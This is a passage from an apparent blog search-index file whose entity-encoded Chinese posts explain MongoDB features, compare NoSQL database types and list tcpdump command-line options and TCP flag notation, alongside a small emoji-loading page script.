100&#xFF0C;&#x6211;&#x4EEC;&#x90FD;&#x53EA;&#x662F;&#x5728;&#x5B58;&#x50A8;&#x6570;&#x5B57;&#x7684;&#x90A3;&#x4E00;&#x4F4D;&#x4E0A;&#x8FDB;&#x884C;&#x4FEE;&#x6539;&#xFF0C;&#x4E0D;&#x4F1A;&#x5BFC;&#x81F4;&#x6570;&#x636E;&#x603B;&#x957F;&#x53D8;&#x5927;&#x3002;&#x5F53;&#x7136;&#xFF0C;&#x5728; MongoDB &#x4E2D;&#xFF0C;&#x5982;&#x679C;&#x6570;&#x5B57;&#x4ECE;&#x6574;&#x5F62;&#x589E;&#x5927;&#x5230;&#x957F;&#x6574;&#x578B;&#xFF0C;&#x8FD8;&#x662F;&#x4F1A;&#x5BFC;&#x81F4;&#x6570;&#x636E;&#x603B;&#x957F;&#x53D8;&#x5927;&#x7684;&#x3002; &#x6709;&#x65F6; BSON &#x76F8;&#x5BF9; JSON &#x6765;&#x8BF4;&#x4E5F;&#x5E76;&#x6CA1;&#x6709;&#x7A7A;&#x95F4;&#x4E0A;&#x7684;&#x4F18;&#x52BF;&#xFF0C;&#x6BD4;&#x5982;&#x5BF9;{&#x201C;sex&#x201D;:1}&#xFF0C;&#x5728; JSON &#x7684;&#x5B58;&#x50A8;&#x4E0A;,&#x2019;1&#x2019;&#x53EA;&#x4F7F;&#x7528;&#x4E86;&#x4E00;&#x4E2A;&#x5B57;&#x8282;&#xFF0C;&#x800C;&#x5982;&#x679C;&#x7528; BSON&#xFF0C;&#x90A3;&#x5C31;&#x662F;&#x81F3;&#x5C11; 4 &#x4E2A;&#x5B57;&#x8282; 2.2 MongoDB &#x7279;&#x70B9;&#x9AD8;&#x6027;&#x80FD;&#xFF1A; Mongodb &#x63D0;&#x4F9B;&#x9AD8;&#x6027;&#x80FD;&#x7684;&#x6570;&#x636E;&#x6301;&#x4E45;&#x6027;&#xFF0C;&#x5C24;&#x5176;&#x662F;&#x652F;&#x6301;&#x5D4C;&#x5165;&#x5F0F;&#x6570;&#x636E;&#x6A21;&#x578B;&#x51CF;&#x5C11;&#x6570;&#x636E;&#x5E93;&#x7CFB;&#x7EDF;&#x4E0A;&#x7684;I/O &#x64CD;&#x4F5C;&#xFF0C;&#x7D22;&#x5F15;&#x652F;&#x6301;&#x80FD;&#x5FEB;&#x7684;&#x67E5;&#x8BE2;&#xFF0C;&#x5E76;&#x4E14;&#x53EF;&#x4EE5;&#x5305;&#x62EC;&#x6765;&#x5D4C;&#x5165;&#x5F0F;&#x6587;&#x6863;&#x548C;&#x6570;&#x7EC4;&#x4E2D;&#x7684;&#x952E; &#x4E30;&#x5BCC;&#x7684;&#x8BED;&#x8A00;&#x67E5;&#x8BE2;&#xFF1A; Mongodb &#x652F;&#x6301;&#x4E30;&#x5BCC;&#x7684;&#x67E5;&#x8BE2;&#x8BED;&#x8A00;&#x6765;&#x652F;&#x6301;&#x8BFB;&#x5199;&#x64CD;&#x4F5C;&#xFF08;CRUD&#xFF09;&#x4EE5;&#x53CA;&#x6570;&#x636E;&#x6C47;&#x603B;&#xFF0C;&#x6587;&#x672C;&#x641C;&#x7D22;&#x548C;&#x5730;&#x7406;&#x7A7A;&#x95F4;&#x7D22;&#x5F15; &#x9AD8;&#x53EF;&#x7528;&#x6027;&#xFF1A; Mongodb &#x7684;&#x590D;&#x5236;&#x5DE5;&#x5177;&#xFF0C;&#x6210;&#x4E3A;&#x526F;&#x672C;&#x96C6;&#xFF0C;&#x63D0;&#x4F9B;&#x81EA;&#x52A8;&#x6545;&#x969C;&#x8F6C;&#x79FB;&#x548C;&#x6570;&#x636E;&#x5197;&#x4F59;&#xFF0C;&#x6C34;&#x5E73;&#x53EF;&#x6269;&#x5C55;&#x6027;&#xFF1A; Mongodb &#x63D0;&#x4F9B;&#x4E86; &#x53EF;&#x6269;&#x5C55;&#x6027;&#xFF0C;&#x4F5C;&#x4E3A;&#x5176;&#x6838;&#x5FC3;&#x529F;&#x80FD;&#x7684;&#x4E00;&#x90E8;&#x5206;&#xFF0C;&#x5206;&#x7247;&#x662F;&#x5C06;&#x6570;&#x636E;&#x5206;&#xFF0C;&#x5728;&#x4E00;&#x7EC4;&#x8BA1;&#x7B97;&#x673A;&#x4E0A;&#x3002; &#x652F;&#x6301;&#x591A;&#x79CD;&#x5B58;&#x50A8;&#x5F15;&#x64CE;&#xFF1A; WiredTiger &#x5B58;&#x50A8;&#x5F15;&#x64CE;&#x548C;&#x3001; MMAPv1 &#x5B58;&#x50A8;&#x5F15;&#x64CE;&#x548C; InMemory &#x5B58;&#x50A8;&#x5F15;&#x64CE; 2.3 MongoDB &#x5305;&#x542B;&#x7684;&#x7A0B;&#x5E8F;MongoDB Drivers&#x5B98;&#x65B9; MongoDB &#x5BA2;&#x6237;&#x7AEF;&#x5E93;&#x63D0;&#x4F9B; C&#xFF0C; C ++&#xFF0C; C&#xFF03;&#xFF0C; Java&#xFF0C; Node.JS&#xFF0C; Perl&#xFF0C; PHP&#xFF0C;Python&#xFF0C; Ruby&#x548C;Scala &#x9A71;&#x52A8;&#x7A0B;&#x5E8F;&#x7684;&#x53C2;&#x8003;&#x6307;&#x5357;&#x3002; MongoDB Stitch&#x4E3A;&#x5F00;&#x53D1;&#x4EBA;&#x5458;&#x63D0;&#x4F9B;&#x4E86;&#x4E00;&#x4E2A; API &#x5230; MongoDB &#x548C;&#x5176;&#x4ED6;&#x540E;&#x7AEF;&#x670D;&#x52A1;&#x3002;&#x4FDD;&#x6301; MongoDB &#x7684;&#x5168;&#x90E8;&#x529F;&#x80FD;&#x548C;&#x7075;&#x6027;&#xFF0C;&#x540C;&#x65F6;&#x53D7;&#x76CA;&#x4E8E;&#x5F3A;&#x5927;&#x7684;&#x7CFB;&#x7EDF;&#x6765;&#x914D;&#x7F6E;&#x7EC6;&#x7C92;&#x5EA6;&#x7684;&#x6570;&#x636E;&#x8BBF;&#x95EE;&#x63A7;&#x5236;&#x3002; MongoDB AtlasMongoDB &#x5728;&#x4E91;&#x4E2D;&#x90E8;&#x7F72;&#xFF0C;&#x64CD;&#x4F5C;&#x548C;&#x6269;&#x5C55;&#x7684;&#x6700;&#x4F73;&#x65B9;&#x5F0F;&#x3002;&#x9002;&#x7528;&#x4E8E; AWS&#xFF0C;Azure &#x548C; Google Cloud Platform&#x3002;&#x8F7B;&#x677E;&#x5C06;&#x6570;&#x636E;&#x8FC1;&#x79FB;&#x5230; MongoDB Atlas&#xFF0C;&#x96F6;&#x505C;&#x673A; MongoDB Cloud Manager&#x662F;&#x4E00;&#x4E2A;&#x7528;&#x4E8E;&#x7BA1;&#x7406; MongoDB &#x90E8;&#x7F72;&#x7684;&#x8F6F;&#x4EF6;&#x5305;&#x3002; Ops Manager &#x63D0;&#x4F9B; Ops Manager &#x76D1;&#x63A7;&#x548C; Ops Manager &#x5907;&#x4EFD;&#xFF0C;&#x53EF;&#x5E2E;&#x52A9;&#x7528;&#x6237;&#x4F18;&#x5316;&#x7FA4;&#x96C6;&#x5E76;&#x964D;&#x4F4E;&#x64CD;&#x4F5C;&#x98CE;&#x9669; MongoDB Charts&#x53EF;&#x4EE5;&#x6700;&#x5FEB;&#x901F;&#x6700;&#x7B80;&#x5355;&#x7684;&#x521B;&#x5EFA; Mongodb &#x53EF;&#x89C6;&#x5316;&#x56FE;&#x8868; MongoDB Connector for BIMongoDB &#x5546;&#x4E1A;&#x667A;&#x80FD;&#x8FDE;&#x63A5;&#x5668;&#xFF08;BI&#xFF09;&#x5141;&#x8BB8;&#x7528;&#x6237;&#x4F7F;&#x7528; SQL &#x521B;&#x5EFA;&#x67E5;&#x8BE2;&#xFF0C;&#x5E76;&#x4F7F;&#x7528;&#x73B0;&#x6709;&#x7684;&#x5173;&#x7CFB;&#x5546;&#x4E1A;&#x667A;&#x80FD;&#x5DE5;&#x5177;&#xFF08;&#x5982; Tableau&#xFF0C; MicroStrategy &#x548C; Qlik&#xFF09;&#x5BF9;&#x5176; MongoDB Enterprise &#x6570;&#x636E;&#x8FDB;&#x884C;&#x53EF;&#x89C6;&#x5316;&#xFF0C;&#x56FE;&#x5F62;&#x5316;&#x548C;&#x62A5;&#x544A;&#x3002; MongoDB Compass&#x901A;&#x8FC7;&#x4ECE;&#x96C6;&#x5408;&#x4E2D;&#x968F;&#x673A;&#x62BD;&#x6837;&#x4E00;&#x4E2A;&#x6587;&#x6863;&#x5B50;&#x96C6;&#xFF0C;&#x4E3A;&#x7528;&#x6237;&#x63D0;&#x4F9B;&#x5176; MongoDB &#x6A21;&#x5F0F;&#x7684;&#x56FE;&#x5F62;&#x89C6;&#x56FE;&#x3002;&#x91C7;&#x6837;&#x6587;&#x4EF6;&#x53EF;&#x6700;&#x5927;&#x7A0B;&#x5EA6;&#x5730;&#x964D;&#x4F4E;&#x5BF9;&#x6570;&#x636E;&#x5E93;&#x7684;&#x5F71;&#x54CD;&#xFF0C;&#x5E76;&#x80FD;&#x5FEB;&#x901F;&#x4EA7;&#x751F;&#x7ED3;&#x679C;&#x3002;&#x6709;&#x5173; &#x62BD;&#x6837;&#x7684;&#x66F4;&#x591A;&#x4FE1;&#x606F; MongoDB Spark Connector&#x4F7F;&#x7528;&#x8FDE;&#x63A5;&#x5668;&#xFF0C;&#x60A8;&#x53EF;&#x4EE5;&#x8BBF;&#x95EE;&#x6240;&#x6709;&#x4F7F;&#x7528; MongoDB &#x6570;&#x636E;&#x96C6;&#x7684; Spark &#x5E93;&#xFF1A;&#x7528; SQL &#x8FDB;&#x884C;&#x5206;&#x6790;&#x7684;&#x6570;&#x636E;&#x96C6;&#xFF08;&#x53D7;&#x76CA;&#x4E8E;&#x81EA;&#x52A8;&#x6A21;&#x5F0F;&#x63A8;&#x7406;&#xFF09;&#xFF0C;&#x6D41;&#x5F0F;&#x4F20;&#x8F93;&#xFF0C;&#x673A;&#x5668;&#x5B66;&#x4E60;&#x548C;&#x56FE;&#x5F62; API&#x3002;&#x60A8;&#x4E5F;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x8FDE;&#x63A5;&#x5668;&#x4E0E; Spark Shell&#x3002; &#x5E94;&#x7528;&#x573A;&#x666F; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"NoSQL知识","date":"2022-06-07T04:42:29.000Z","path":"/posts/36ba38f9/","text":"NoSQLNoSQL&#xFF08;Not Only SQL&#xFF09;&#xFF0C;&#x610F;&#x5373;&#x201D;&#x4E0D;&#x4EC5;&#x4EC5;&#x662F; SQL&#x201D;&#x3002; NoSQL&#x6700;&#x5E38;&#x89C1;&#x7684;&#x89E3;&#x91CA;&#x662F;non-relational&#xFF0C;Not Only SQL&#x4E5F;&#x88AB;&#x5F88;&#x591A;&#x4EBA;&#x63A5;&#x53D7;&#x3002;NoSQL&#x4EC5;&#x4EC5;&#x662F;&#x4E00;&#x4E2A;&#x6982;&#x5FF5;&#xFF0C;&#x6CDB;&#x6307;&#x975E;&#x5173;&#x7CFB;&#x578B;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x533A;&#x522B;&#x4E0E;&#x5173;&#x7CFB;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x5B83;&#x4EEC;&#x4E0D;&#x4FDD;&#x8BC1;&#x5173;&#x7CFB;&#x6570;&#x636E;&#x7684;ACID&#x7279;&#x6027;&#x3002;&#x8981;&#x89E3;&#x7B54;&#x7B2C;&#x4E00;&#x70B9;&#x7591;&#x95EE;&#xFF0C;&#x9996;&#x5148;&#x8981;&#x660E;&#x767D;NoSQL&#x662F;&#x4E3A;&#x4E86;&#x89E3;&#x51B3;&#x4EC0;&#x4E48;&#x51FA;&#x73B0;&#x7684;&#xFF0C;&#x5B9E;&#x9645;&#x4E0A;NoSQL&#x662F;&#x968F;&#x7740;&#x5927;&#x6570;&#x636E;&#x65F6;&#x4EE3;&#x9700;&#x6C42;&#x63D0;&#x51FA;&#x6240;&#x9010;&#x6E10;&#x53D1;&#x5C55;&#x7684;&#xFF0C;&#x9488;&#x5BF9;&#x6D77;&#x91CF;&#x7684;&#x6570;&#x636E;&#x751A;&#x81F3;&#x662F;&#x975E;&#x7ED3;&#x6784;&#x5316;&#x6570;&#x636E;&#x8981;&#x5B9E;&#x73B0;&#x9AD8;&#x5E76;&#x53D1;&#xFF0C;&#x9AD8;&#x53EF;&#x6269;&#xFF0C;&#x4EE5;&#x53CA;&#x9AD8;&#x6027;&#x80FD;&#x7684;&#x7279;&#x70B9;&#x3002; 1. &#x9996;&#x5148;&#x662F;&#x9AD8;&#x5E76;&#x53D1;&#xFF0C;&#x5927;&#x591A;&#x6570;&#x65F6;&#x5019;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;NoSQL&#x505A;&#x7F13;&#x51B2;&#x64CD;&#x4F5C;&#xFF0C;&#x8BA9;&#x8BF7;&#x6C42;&#x8BBF;&#x95EE;&#x5230;NoSQL&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x76F4;&#x63A5;&#x8BBF;&#x95EE;&#x5173;&#x7CFB;&#x578B;&#x6570;&#x636E;&#x5E93;&#x3002;&#x63D0;&#x4F9B;&#x4E86;&#x5173;&#x7CFB;&#x578B;&#x6570;&#x636E;&#x5E93;&#x4E3B;&#x4ECE;&#x5206;&#x7C7B;&#x5BF9;&#x9AD8;&#x5E76;&#x53D1;&#x4E4B;&#x5916;&#x7684;&#x5176;&#x5B83;&#x5E76;&#x53D1;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#x3002;2. &#x7B2C;&#x4E8C;&#x70B9;&#x5C31;&#x662F;&#x9AD8;&#x53EF;&#x6269;&#xFF0C;NoSQL&#x65E0;&#x9700;&#x4E8B;&#x5148;&#x4E3A;&#x8981;&#x5B58;&#x50A8;&#x7684;&#x6570;&#x636E;&#x5EFA;&#x7ACB;&#x5B57;&#x6BB5;&#xFF0C;&#x968F;&#x65F6;&#x53EF;&#x4EE5;&#x5B58;&#x50A8;&#x81EA;&#x5B9A;&#x4E49;&#x7684;&#x6570;&#x636E;&#x683C;&#x5F0F;&#x3002;NoSQL&#x6570;&#x636E;&#x5E93;&#x79CD;&#x7C7B;&#x7E41;&#x591A;&#xFF0C;&#x4F46;&#x662F;&#x4E00;&#x4E2A;&#x5171;&#x540C;&#x70B9;&#x90FD;&#x662F;&#x53BB;&#x6389;&#x5173;&#x7CFB;&#x6570;&#x636E;&#x5E93;&#x7684;&#x5173;&#x7CFB;&#x578B;&#x7279;&#x6027;&#x3002;&#x6570;&#x636E;&#x4E4B;&#x95F4;&#x65E0;&#x5173;&#x7CFB;&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x975E;&#x5E38;&#x5BB9;&#x6613;&#x6269;&#x5C55;&#x3002;&#x4E5F;&#x65E0;&#x5F62;&#x4E4B;&#x95F4;&#xFF0C;&#x5728;&#x67B6;&#x6784;&#x7684;&#x5C42;&#x9762;&#x4E0A;&#x5E26;&#x6765;&#x4E86;&#x53EF;&#x6269;&#x5C55;&#x7684;&#x80FD;&#x529B;&#x3002;3. &#x6700;&#x540E;&#x4E00;&#x70B9;&#x662F;&#x9AD8;&#x6027;&#x80FD;&#xFF0C;&#x8FD9;&#x4E00;&#x70B9;&#x8DDF;&#x7B2C;&#x4E00;&#x70B9;&#x9AD8;&#x5E76;&#x53D1;&#x606F;&#x606F;&#x76F8;&#x5173;&#x7684;&#xFF0C;&#x4E3B;&#x8981;&#x662F;&#x7531;&#x4E8E;NoSQL&#x6570;&#x636E;&#x5E93;&#x90FD;&#x5177;&#x6709;&#x975E;&#x5E38;&#x9AD8;&#x7684;&#x8BFB;&#x5199;&#x6027;&#x80FD;&#xFF0C;&#x5C24;&#x5176;&#x5728;&#x5927;&#x6570;&#x636E;&#x91CF;&#x4E0B;&#xFF0C;&#x540C;&#x6837;&#x8868;&#x73B0;&#x4F18;&#x79C0;&#x3002;&#x8FD9;&#x5F97;&#x76CA;&#x4E8E;&#x5B83;&#x7684;&#x65E0;&#x5173;&#x7CFB;&#x6027;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x7684;&#x7ED3;&#x6784;&#x7B80;&#x5355;&#x3002; &#x4E3A;&#x4EC0;&#x4E48;&#x4F7F;&#x7528;NoSQL &#x9700;&#x6C42; NoSQL&#x7684;&#x89E3;&#x51B3;&#x65B9;&#x6848; &#x9AD8;&#x5E76;&#x53D1; &#x4F7F;&#x7528;NoSQL&#x505A;&#x7F13;&#x51B2;&#x64CD;&#x4F5C;&#xFF0C;&#x8BA9;&#x8BF7;&#x6C42;&#x5148;&#x8BBF;&#x95EE;&#x5230;NoSQL&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x76F4;&#x63A5;&#x8BBF;&#x95EE;&#x5173;&#x7CFB;&#x578B;&#x6570;&#x636E;&#x5E93;&#x3002; &#x9AD8;&#x53EF;&#x6269; NoSQL&#x65E0;&#x9700;&#x4E8B;&#x5148;&#x4E3A;&#x8981;&#x5B58;&#x50A8;&#x7684;&#x6570;&#x636E;&#x5EFA;&#x7ACB;&#x5B57;&#x6BB5;&#xFF0C;&#x968F;&#x65F6;&#x53EF;&#x4EE5;&#x5B58;&#x50A8;&#x81EA;&#x5B9A;&#x4E49;&#x7684;&#x6570;&#x636E;&#x683C;&#x5F0F; &#x9AD8;&#x6027;&#x80FD; NoSQL&#x6570;&#x636E;&#x5E93;&#x90FD;&#x5177;&#x6709;&#x975E;&#x5E38;&#x9AD8;&#x7684;&#x8BFB;&#x5199;&#x6027;&#x80FD;&#xFF0C;&#x5C24;&#x5176;&#x5728;&#x5927;&#x6570;&#x636E;&#x91CF;&#x4E0B;&#xFF0C;&#x540C;&#x6837;&#x8868;&#x73B0;&#x4F18;&#x79C0;&#x3002;&#x8FD9;&#x5F97;&#x76CA;&#x4E8E;&#x5B83;&#x7684;&#x65E0;&#x5173;&#x7CFB;&#x6027;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x7684;&#x7ED3;&#x6784;&#x7B80;&#x5355; &#x5404;&#x79CD;&#x7C7B;&#x578B;&#x7684;NoSQL&#x6BD4;&#x8F83; &#x5206;&#x7C7B; &#x4E3E;&#x4F8B; &#x5E94;&#x7528;&#x573A;&#x666F;/&#x7279;&#x6027; KV&#x578B;NoSQL Redis&#xFF0C;memcachedDB &#x7528;&#x4E8E;&#x5185;&#x5BB9;&#x7F13;&#x5B58;&#x7B49;&#xFF0C;&#x6570;&#x636E;&#x57FA;&#x4E8E;&#x5185;&#x5B58;&#xFF0C;&#x8BFB;&#x5199;&#x6548;&#x7387;&#x9AD8;&#xFF0C;KV&#x578B;&#x6570;&#x636E;&#xFF0C;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x4E3A;O(1)&#xFF0C;&#x67E5;&#x8BE2;&#x901F;&#x5EA6;&#x5FEB; &#x5217;&#x5F0F;NoSQL HBase&#xFF0C;Cassandra &#x5217;&#x5F0F;NoSql&#x548C;&#x5173;&#x7CFB;&#x578B;&#x6570;&#x636E;&#x5E93;&#x4E00;&#x6837;&#x90FD;&#x6709;&#x4E3B;&#x952E;&#x7684;&#x6982;&#x5FF5;&#xFF0C;&#x533A;&#x522B;&#x5728;&#x4E8E;&#x5173;&#x7CFB;&#x578B;&#x6570;&#x636E;&#x5E93;&#x662F;&#x6309;&#x7167;&#x884C;&#x7EC4;&#x7EC7;&#x7684;&#x6570;&#x636E;, HBase&#x6BD4;&#x8F83;&#x9002;&#x7528;&#x4E8E;&#x90A3;&#x79CD;KV&#x578B;&#x7684;&#x4E14;&#x672A;&#x6765;&#x65E0;&#x6CD5;&#x9884;&#x4F30;&#x6570;&#x636E;&#x589E;&#x957F;&#x91CF;&#x7684;&#x573A;&#x666F; &#x6587;&#x6863;&#x578B;NoSQL CouchDB,MongoDB MongDB&#x7684;&#x4F7F;&#x7528;&#x573A;&#x666F;&#x5F88;&#x5927;&#x7A0B;&#x5EA6;&#x4E0A;&#x53EF;&#x4EE5;&#x5BF9;&#x6807;&#x5173;&#x7CFB;&#x578B;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x4F46;&#x662F;&#x6BD4;&#x8F83;&#x9002;&#x5408;&#x5904;&#x7406;&#x90A3;&#x4E9B;&#x6CA1;&#x6709;join&#x3001;&#x6CA1;&#x6709;&#x5F3A;&#x4E00;&#x81F4;&#x6027;&#x8981;&#x6C42;&#x4E14;&#x8868;&#x7ED3;&#x6784;&#x4F1A;&#x5E38;&#x53D8;&#x5316;&#x7684;&#x6570;&#x636E;&#x3002; &#x641C;&#x7D22;&#x578B;NoSQL Elasticsearch &#x641C;&#x7D22;&#x578B;NoSql&#x6700;&#x9002;&#x7528;&#x7684;&#x573A;&#x666F;&#x5C31;&#x662F;&#x6709;&#x6761;&#x4EF6;&#x641C;&#x7D22;&#x5C24;&#x5176;&#x662F;&#x5168;&#x6587;&#x641C;&#x7D22;&#x7684;&#x573A;&#x666F;&#xFF0C;&#x4F5C;&#x4E3A;&#x5173;&#x7CFB;&#x578B;&#x6570;&#x636E;&#x5E93;&#x7684;&#x4E00;&#x79CD;&#x66FF;&#x4EE3;&#x65B9;&#x6848;&#x3002; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"tcpdump与Wireshark的使用","date":"2022-06-07T04:42:00.000Z","path":"/posts/6efb91e0/","text":"tcpdump &#x4E00;&#x6B3E;sniffer&#x5DE5;&#x5177;&#xFF0C;&#x662F;Linux&#x4E0A;&#x7684;&#x6293;&#x5305;&#x5DE5;&#x5177;&#xFF0C;&#x55C5;&#x63A2;&#x5668; &#x9009;&#x9879;12345678910111213141516171819202122232425-a: &#x5C1D;&#x8BD5;&#x5C06;&#x7F51;&#x7EDC;&#x548C;&#x5E7F;&#x64AD;&#x5730;&#x5740;&#x8F6C;&#x6362;&#x6210;&#x540D;&#x79F0;&#xFF1B;-c&lt;&#x6570;&#x636E;&#x5305;&#x6570;&#x76EE;&gt;&#xFF1A;&#x6536;&#x5230;&#x6307;&#x5B9A;&#x7684;&#x6570;&#x636E;&#x5305;&#x6570;&#x76EE;&#x540E;&#xFF0C;&#x5C31;&#x505C;&#x6B62;&#x8FDB;&#x884C;&#x503E;&#x5012;&#x64CD;&#x4F5C;&#xFF1B;-d&#xFF1A;&#x628A;&#x7F16;&#x8BD1;&#x8FC7;&#x7684;&#x6570;&#x636E;&#x5305;&#x7F16;&#x7801;&#x8F6C;&#x6362;&#x6210;&#x53EF;&#x9605;&#x8BFB;&#x7684;&#x683C;&#x5F0F;&#xFF0C;&#x5E76;&#x503E;&#x5012;&#x5230;&#x6807;&#x51C6;&#x8F93;&#x51FA;&#xFF1B;-dd&#xFF1A;&#x628A;&#x7F16;&#x8BD1;&#x8FC7;&#x7684;&#x6570;&#x636E;&#x5305;&#x7F16;&#x7801;&#x8F6C;&#x6362;&#x6210;C&#x8BED;&#x8A00;&#x683C;&#x5F0F;&#xFF0C;&#x5E76;&#x503E;&#x5012;&#x5230;&#x6807;&#x51C6;&#x8F93;&#x51FA;&#xFF1B;-ddd&#xFF1A;&#x628A;&#x7F16;&#x8BD1;&#x8FC7;&#x7684;&#x6570;&#x636E;&#x5305;&#x7F16;&#x7801;&#x8F6C;&#x6362;&#x6210;&#x5341;&#x8FDB;&#x5236;&#x6570;&#x5B57;&#x7684;&#x683C;&#x5F0F;&#xFF0C;&#x5E76;&#x503E;&#x5012;&#x5230;&#x6807;&#x51C6;&#x8F93;&#x51FA;&#xFF1B;-e&#xFF1A;&#x5728;&#x6BCF;&#x5217;&#x503E;&#x5012;&#x8D44;&#x6599;&#x4E0A;&#x663E;&#x793A;&#x8FDE;&#x63A5;&#x5C42;&#x7EA7;&#x7684;&#x6587;&#x4EF6;&#x5934;&#xFF1B;-f&#xFF1A;&#x7528;&#x6570;&#x5B57;&#x663E;&#x793A;&#x7F51;&#x9645;&#x7F51;&#x7EDC;&#x5730;&#x5740;&#xFF1B;-F&lt;&#x8868;&#x8FBE;&#x6587;&#x4EF6;&gt;&#xFF1A;&#x6307;&#x5B9A;&#x5185;&#x542B;&#x8868;&#x8FBE;&#x65B9;&#x5F0F;&#x7684;&#x6587;&#x4EF6;&#xFF1B;-i&lt;&#x7F51;&#x7EDC;&#x754C;&#x9762;&gt;&#xFF1A;&#x4F7F;&#x7528;&#x6307;&#x5B9A;&#x7684;&#x7F51;&#x7EDC;&#x622A;&#x9762;&#x9001;&#x51FA;&#x6570;&#x636E;&#x5305;&#xFF1B;-l&#xFF1A;&#x4F7F;&#x7528;&#x6807;&#x51C6;&#x8F93;&#x51FA;&#x5217;&#x7684;&#x7F13;&#x51B2;&#x533A;&#xFF1B;-n&#xFF1A;&#x4E0D;&#x628A;&#x4E3B;&#x673A;&#x7684;&#x7F51;&#x7EDC;&#x5730;&#x5740;&#x8F6C;&#x6362;&#x6210;&#x540D;&#x5B57;&#xFF1B;-N&#xFF1A;&#x4E0D;&#x5217;&#x51FA;&#x57DF;&#x540D;&#xFF1B;-O&#xFF1A;&#x4E0D;&#x5C06;&#x6570;&#x636E;&#x5305;&#x7F16;&#x7801;&#x6700;&#x4F73;&#x5316;&#xFF1B;-p&#xFF1A;&#x4E0D;&#x8BA9;&#x7F51;&#x7EDC;&#x754C;&#x9762;&#x8FDB;&#x5165;&#x6DF7;&#x6742;&#x6A21;&#x5F0F;&#xFF1B;-q&#xFF1A;&#x5FEB;&#x901F;&#x8F93;&#x51FA;&#xFF0C;&#x4EC5;&#x5217;&#x51FA;&#x5C11;&#x6570;&#x7684;&#x4F20;&#x8F93;&#x534F;&#x8BAE;&#x4FE1;&#x606F;&#xFF1B;-r&lt;&#x6570;&#x636E;&#x5305;&#x6587;&#x4EF6;&gt;&#xFF1A;&#x4ECE;&#x6307;&#x5B9A;&#x7684;&#x6587;&#x4EF6;&#x8BFB;&#x53D6;&#x6570;&#x636E;&#x5305;&#x6570;&#x636E;&#xFF1B;-s&lt;&#x6570;&#x636E;&#x5305;&#x5927;&#x5C0F;&gt;&#xFF1A;&#x8BBE;&#x7F6E;&#x6BCF;&#x4E2A;&#x6570;&#x636E;&#x5305;&#x7684;&#x5927;&#x5C0F;&#xFF1B;-S&#xFF1A;&#x7528;&#x7EDD;&#x5BF9;&#x800C;&#x975E;&#x76F8;&#x5BF9;&#x6570;&#x503C;&#x5217;&#x51FA;TCP&#x5173;&#x8054;&#x6570;&#xFF1B;-t&#xFF1A;&#x5728;&#x6BCF;&#x5217;&#x503E;&#x5012;&#x8D44;&#x6599;&#x4E0A;&#x663E;&#x793A;&#x65F6;&#x95F4;&#x6233;&#x8BB0;&#xFF1B;-tt&#xFF1A;&#x5728;&#x6BCF;&#x5217;&#x503E;&#x5012;&#x8D44;&#x6599;&#x4E0A;&#x663E;&#x793A;&#x672A;&#x7ECF;&#x683C;&#x5F0F;&#x5316;&#x7684;&#x65F6;&#x95F4;&#x6233;&#x8BB0;&#xFF1B;-T&lt;&#x6570;&#x636E;&#x5305;&#x7C7B;&#x578B;&gt;&#xFF1A;&#x5F3A;&#x5236;&#x5C06;&#x8868;&#x8FBE;&#x65B9;&#x5F0F;&#x6240;&#x6307;&#x5B9A;&#x7684;&#x6570;&#x636E;&#x5305;&#x8F6C;&#x8BD1;&#x6210;&#x8BBE;&#x7F6E;&#x7684;&#x6570;&#x636E;&#x5305;&#x7C7B;&#x578B;-v&#xFF1A;&#x8BE6;&#x7EC6;&#x663E;&#x793A;&#x6307;&#x4EE4;&#x6267;&#x884C;&#x8FC7;&#x7A0B;-vv&#xFF1A;&#x66F4;&#x8BE6;&#x7EC6;&#x663E;&#x793A;&#x6307;&#x4EE4;&#x6267;&#x884C;&#x8FC7;&#x7A0B;-x&#xFF1A;&#x7528;&#x5341;&#x516D;&#x8FDB;&#x5236;&#x7801;&#x5217;&#x51FA;&#x6570;&#x636E;&#x5305;&#x8D44;&#x6599;&#xFF1B;-w&lt;&#x6570;&#x636E;&#x5305;&#x6587;&#x4EF6;&gt;&#xFF1A;&#x628A;&#x6570;&#x636E;&#x5305;&#x6570;&#x636E;&#x5199;&#x5165;&#x6307;&#x5B9A;&#x7684;&#x6587;&#x4EF6;&#x3002; [S]: SYN(&#x5F00;&#x59CB;&#x8FDE;&#x63A5;)[.]:&#x6CA1;&#x6709;Flag&#xFF0C;&#xFF08;&#x7531;&#x4E8E;&#x9664;&#x4E86;SYN&#x5305;&#x5916;&#x6240;&#x6709;&#x7684;&#x6570;&#x636E;&#x5305;&#x90FD;&#x6709;ACK&#xFF0C;&#x6240;&#x4EE5;&#x4E00;&#x822C;&#x8FD9;&#x4E2A;&#x6807;&#x5FD7;&#x4E5F;&#x53EF;&#x8868;&#x793A;ACK&#xFF09;[P]: PSH(&#x63A8;&#x9001;&#x6570;&#x636E;[F]: FIN(&#x7ED3;&#x675F;&#x8FDE;&#x63A5;[R]: RST(&#x91CD;&#x7F6E;&#x8FDE;&#x63A5;[S.]: &#x8868;&#x793A;SYN-ACK&#xFF0C;&#x5C31;&#x662F;SYN&#x62A5;&#x6587;&#x7684;&#x5E94;&#x7B54;&#x62A5;&#x6587; 